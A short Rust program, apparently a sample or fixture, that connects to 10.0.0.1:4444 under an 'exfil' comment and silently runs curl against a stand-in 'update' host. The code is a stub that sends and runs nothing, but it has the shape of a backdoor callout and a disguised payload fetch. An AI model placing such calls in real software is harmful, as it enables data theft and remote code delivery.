use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1:4444") { /* exfil */ }
    Command::new("curl").arg("-s").arg("http://update-service.example/x").spawn().ok();
}
